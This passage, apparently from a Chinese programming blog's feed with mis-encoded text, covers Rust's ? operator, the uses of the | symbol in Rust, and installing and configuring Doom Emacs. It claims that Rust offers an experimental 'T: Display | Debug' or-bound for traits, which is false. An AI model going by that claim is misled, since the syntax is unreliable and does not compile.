&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ä½¿ç”¨é—®å·è¿ç®—ç¬¦ï¼Œè¡¨è¾¾å¼åŒ¹é… Err æ—¶ç«‹å³æ‰§è¡Œ return
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">File&lt;/span>::&lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;hello.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">read_to_string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">username&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>é™¤äº†åœ¨é‡åˆ°é”™è¯¯æ—¶æ‰§è¡Œ early return, &lt;code>?&lt;/code> è¿ç®—ç¬¦è¿˜é¢å¤–æä¾›é”™è¯¯ç±»å‹çš„è‡ªåŠ¨è½¬æ¢åŠŸèƒ½ã€‚å…·ä½“è€Œè¨€ï¼Œå¦‚æœå‘ç”Ÿçš„é”™è¯¯å’Œå‡½æ•°çš„è¿”å›å€¼å£°æ˜ä¸­çš„é”™è¯¯ç±»å‹ä¸åŒï¼Œåªè¦è¯¥é”™è¯¯ç±»å‹å®ç°äº†ç›¸åº”çš„ &lt;code>From&lt;/code> trait, åˆ™ä¼šè¿›è¡Œè‡ªåŠ¨è½¬æ¢ã€‚ä¾‹å¦‚ï¼š&lt;/p>
&lt;ol>
&lt;li>è¿”å›çš„ Result ç±»å‹å£°æ˜ä¸º &lt;code>Result&amp;lt;String, OurError&amp;gt;&lt;/code> ï¼ˆ &lt;code>OurError&lt;/code> ä¸ºè‡ªå®šä¹‰çš„é”™è¯¯ç±»å‹ï¼‰ï¼Œå‡½æ•°ä½“ä¸­è¿”å›äº† &lt;code>io::Error&lt;/code> ç±»å‹çš„é”™è¯¯ã€‚&lt;/li>
&lt;li>&lt;code>OurError&lt;/code> å®ç°äº† &lt;code>impl From&amp;lt;io::Error&amp;gt; for OurError&lt;/code> ã€‚&lt;/li>
&lt;li>&lt;code>?&lt;/code> è¿ç®—ç¬¦ä¼šè‡ªåŠ¨æ‰§è¡Œ &lt;code>from&lt;/code> è½¬æ¢ï¼Œå°† &lt;code>io::Error&lt;/code> è½¬æ¢ä¸º &lt;code>OurError&lt;/code> å¹¶è¿”å›ã€‚&lt;/li>
&lt;/ol>
&lt;h3 id="main-å‡½æ•°çš„è¿”å›å€¼">main å‡½æ•°çš„è¿”å›å€¼&lt;/h3>
&lt;p>main å‡½æ•°å¯ä»¥è¿”å›ä¸¤ç±»å€¼ï¼š&lt;/p>
&lt;dl>
&lt;dt>&lt;code>Result&amp;lt;T, E&amp;gt;&lt;/code>&lt;/dt>
&lt;dd>è¿”å› &lt;code>Ok&amp;lt;T&amp;gt;&lt;/code> è¡¨ç¤ºæˆåŠŸï¼Œ &lt;code>Err&amp;lt;E&amp;gt;&lt;/code> è¡¨ç¤ºå¤±è´¥ã€‚&lt;/dd>
&lt;dt>&lt;code>Termination&lt;/code> trait&lt;/dt>
&lt;dd>è¯¥ trait åŒ…å«ä¸€ä¸ª &lt;code>report&lt;/code> æ–¹æ³•ï¼Œç”¨æ¥è¿”å›ä¸€ä¸ª &lt;a href="https://doc.rust-lang.org/std/process/struct.ExitCode.html">ExitCode&lt;/a>ã€‚&lt;/dd>
&lt;/dl>
&lt;h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://doc.rust-lang.org/book/ch10-02-traits.html">Traits: Defining Shared Behavior&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://doc.rust-lang.org/book/appendix-03-derivable-traits.html">Derivable Traits&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://doc.rust-lang.org/book/ch15-02-deref.html">Treating Smart Pointers Like Regular References with the Deref Trait&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://doc.rust-lang.org/rust-by-example/conversion/try_from_try_into.html">TryFrom and TryInto - Rust By Example&lt;/a>&lt;/li>
&lt;/ul></content><category scheme="https://mincodes.com/tags/rust/" term="Rust" label="Rust"/></entry><entry><title type="text">Rust ä¸­çš„ | (ç«–çº¿) ç¬¦å·</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/rust-vertical-line/"/><id>https://mincodes.com/posts/rust-vertical-line/</id><updated>2023-12-19T20:46:40+08:00</updated><published>2023-12-18T21:20:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">Rust ä¸­çš„ | ç”¨é€”æ¯”è¾ƒå¤šï¼Œè¿™é‡Œåšä¸€ä¸ªç®€å•çš„æ•´ç†ã€‚ æ¨¡å¼åŒ¹é…ä¸­çš„â€œæˆ–â€æ¨¡å¼ (Pattern Alternatives) åœ¨æ¨¡å¼åŒ¹é…ï¼ˆå¦‚ match è¯­å¥æˆ– if let è¡¨è¾¾å¼â€¦</summary><content type="html">&lt;p>Rust ä¸­çš„ &lt;code>|&lt;/code> ç”¨é€”æ¯”è¾ƒå¤šï¼Œè¿™é‡Œåšä¸€ä¸ªç®€å•çš„æ•´ç†ã€‚&lt;/p>
&lt;h2 id="æ¨¡å¼åŒ¹é…ä¸­çš„-æˆ–-æ¨¡å¼--pattern-alternatives">æ¨¡å¼åŒ¹é…ä¸­çš„â€œæˆ–â€æ¨¡å¼ (Pattern Alternatives)&lt;/h2>
&lt;p>åœ¨æ¨¡å¼åŒ¹é…ï¼ˆå¦‚ &lt;code>match&lt;/code> è¯­å¥æˆ– &lt;code>if let&lt;/code> è¡¨è¾¾å¼ï¼‰ä¸­ï¼Œ &lt;code>|&lt;/code> å¯ä»¥ç”¨æ¥è¡¨ç¤ºå¤šä¸ªæ¨¡å¼çš„ç»„åˆï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">process_keypress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Result&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">io&lt;/span>::&lt;span class="n">Error&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pressed_key&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">read_key&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Key&lt;/span>::&lt;span class="n">Ctrl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sc">&amp;#39;q&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Key&lt;/span>::&lt;span class="n">Ctrl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sc">&amp;#39;x&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pressed_key&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">should_quit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// å’Œä¸‹é¢è¿™å¥ç­‰ä»·ï¼š
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">match&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">pressed_key&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">Key&lt;/span>::&lt;span class="n">Ctrl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sc">&amp;#39;q&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Key&lt;/span>::&lt;span class="n">Ctrl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sc">&amp;#39;x&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">should_quit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">_&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(())&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="é—­åŒ…å‚æ•°">é—­åŒ…å‚æ•°&lt;/h2>
&lt;p>åœ¨ Rust çš„é—­åŒ…ä¸­ï¼Œ æˆ‘ä»¬åœ¨ä¸¤ä¸ª &lt;code>|&lt;/code> ä¹‹é—´å®šä¹‰é—­åŒ…çš„å‚æ•°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">add_one&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">result&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">add_one&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‚æ•°å¯ä»¥æœ‰å¤šä¸ªï¼Œä¹Ÿå¯ä»¥ç•™ç©ºã€‚&lt;/p>
&lt;p>ä¸¥æ ¼æ„ä¹‰æ¥è¯´ï¼Œåœ¨é—­åŒ…ä¸­çš„ç”¨æ³•ä¸æ˜¯æ“ä½œç¬¦ï¼Œåº”è¯¥ç®—æ˜¯ Rust è¯­æ³•çš„ä¸€éƒ¨åˆ†ã€‚&lt;/p>
&lt;h2 id="ä½æˆ–--bitwise-or--æ“ä½œ">ä½æˆ– (Bitwise OR) æ“ä½œ&lt;/h2>
&lt;p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œå’Œå…¶ä»–è¯­è¨€ä¸­ä¸€è‡´ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mb">0b1010&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mb">0b1100&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="é€»è¾‘æˆ–-æ“ä½œç¬¦">é€»è¾‘æˆ– &lt;code>||&lt;/code> æ“ä½œç¬¦&lt;/h2>
&lt;p>è¿™ä¸ªä¹Ÿè·Ÿå…¶ä»–è¯­è¨€ä¸€æ ·ï¼Œç”¨äºè¿æ¥ä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;è‡³å°‘ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸ&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸ºå‡&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ç±»å‹çº¦æŸä¸­çš„-æˆ–-çº¦æŸ">ç±»å‹çº¦æŸä¸­çš„â€œæˆ–â€çº¦æŸ&lt;/h2>
&lt;p>åœ¨ä½¿ç”¨æ³›å‹å’Œ &lt;em>trait&lt;/em> æ—¶ï¼Œ &lt;code>|&lt;/code> å¯ä»¥ç”¨äºæŒ‡å®šç±»å‹å¿…é¡»å®ç°å¤šä¸ª trait ä¸­çš„ä»»æ„ä¸€ä¸ªï¼ˆç›®å‰è¿™ä¸ªç”¨æ³•è¿˜åœ¨å®éªŒé˜¶æ®µï¼Œéœ€è¦åœ¨ &lt;em>Cargo.toml&lt;/em> ä¸­å¯ç”¨ç‰¹å®šçš„ç‰¹æ€§ï¼‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">fn&lt;/span> &lt;span class="nf">do_something&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>: &lt;span class="nc">Display&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Debug&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ &lt;code>T&lt;/code> ç±»å‹å‚æ•°å¿…é¡»å®ç° &lt;code>Display&lt;/code> æˆ– &lt;code>Debug&lt;/code> trait ä¸­çš„è‡³å°‘ä¸€ä¸ªã€‚&lt;/p></content><category scheme="https://mincodes.com/tags/rust/" term="Rust" label="Rust"/></entry><entry><title type="text">Doom Emacs çš„åŸºæœ¬ç”¨æ³•</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/basic-usage-of-doom-emacs/"/><id>https://mincodes.com/posts/basic-usage-of-doom-emacs/</id><updated>2023-12-08T17:01:09+08:00</updated><published>2023-12-08T16:49:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">å®‰è£… 1 2 git clone --depth 1 https://github.com/doomemacs/doomemacs ~/.config/emacs ~/.config/emacs/bin/doom install ç¯å¢ƒå˜é‡ æ‰§è¡Œ doom env å‘½ä»¤ï¼Œå¯ä»¥ dump ä¸€ä»½å½“å‰çš„ shell ç¯å¢ƒå˜é‡ï¼ŒDoom å¯åŠ¨æ—¶ä¼šåŠ è½½è¯¥ç¯å¢ƒâ€¦</summary><content type="html">&lt;h2 id="å®‰è£…">å®‰è£…&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git clone --depth &lt;span class="m">1&lt;/span> https://github.com/doomemacs/doomemacs ~/.config/emacs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">~/.config/emacs/bin/doom install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ç¯å¢ƒå˜é‡">ç¯å¢ƒå˜é‡&lt;/h3>
&lt;p>æ‰§è¡Œ &lt;code>doom env&lt;/code> å‘½ä»¤ï¼Œå¯ä»¥ dump ä¸€ä»½å½“å‰çš„ shell ç¯å¢ƒå˜é‡ï¼ŒDoom å¯åŠ¨æ—¶ä¼šåŠ è½½è¯¥ç¯å¢ƒå˜é‡ã€‚å¦‚æœä½ çš„ç¯å¢ƒå˜é‡é…ç½®å‘ç”Ÿå˜åŒ–ï¼ˆä¾‹å¦‚ä¿®æ”¹äº† PATH é…ç½®ï¼‰ï¼Œåˆ™åº”è¯¥é‡æ–°æ‰§è¡Œä¸€æ¬¡è¯¥å‘½ä»¤ã€‚&lt;/p>
&lt;h2 id="é…ç½®-and-åŒæ­¥">é…ç½® &amp;amp; åŒæ­¥&lt;/h2>
&lt;p>é…ç½®ä¸»è¦æ˜¯ä¿®æ”¹ä¸¤ä¸ªæ–‡ä»¶ï¼š&lt;/p>
&lt;dl>
&lt;dt>&lt;code>init.el&lt;/code>&lt;/dt>
&lt;dd>ä¸»è¦ç”¨äºé…ç½® Doom çš„æ¨¡å—ï¼Œå¯ä»¥å¼€å¯ã€å…³é—­æ¨¡å—ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æ¨¡å—çš„ä¸€äº›é€‰é¡¹ã€‚&lt;/dd>
&lt;dt>&lt;code>packages.el&lt;/code>&lt;/dt>
&lt;dd>ä¸»è¦ç”¨äºå®‰è£…ä¸€äº›ç¬¬ä¸‰æ–¹çš„ Emacs æ’ä»¶ï¼Œè¯­æ³•ç±»ä¼¼äº
&lt;code>straight-use-package&lt;/code> ã€‚å…¶åº•å±‚å°±æ˜¯é€šè¿‡ &lt;code>straight.el&lt;/code> æ¥å®ç°çš„ã€‚&lt;/dd>
&lt;/dl>
&lt;blockquote>
&lt;p>â€¼ï¸ ä¸Šè¿°ä¸¤ä¸ªæ–‡ä»¶ä¿®æ”¹ä¹‹å’Œï¼Œéƒ½éœ€è¦æ‰§è¡Œ &lt;code>doom sync&lt;/code> å‘½ä»¤ï¼Œå¹¶é‡å¯ Emacs æ‰èƒ½ç”Ÿæ•ˆã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="å‡çº§">å‡çº§&lt;/h2>
&lt;p>å‡çº§åˆ†ä¸¤éƒ¨åˆ†ï¼š&lt;/p>
&lt;ul>
&lt;li>doom æœ¬èº«åŠå…¶ç®¡ç†çš„ pacakges&lt;/li>
&lt;li>&lt;code>packages.el&lt;/code> é‡Œé¢å®‰è£…çš„ç¬¬ä¸‰æ–¹ pacakges&lt;/li>
&lt;/ul>
&lt;h3 id="å‡çº§-doom-æœ¬èº«åŠå…¶ç®¡ç†çš„-pacakges">å‡çº§ doom æœ¬èº«åŠå…¶ç®¡ç†çš„ pacakges&lt;/h3>
&lt;ol>
&lt;li>&lt;code>doom upgrade&lt;/code> å‡çº§ doom åŠå…¶å®‰è£…çš„ pacakges&lt;/li>
&lt;li>&lt;code>doom build&lt;/code> é‡æ–°ç¼–è¯‘æ‰€æœ‰çš„ pacakges&lt;/li>
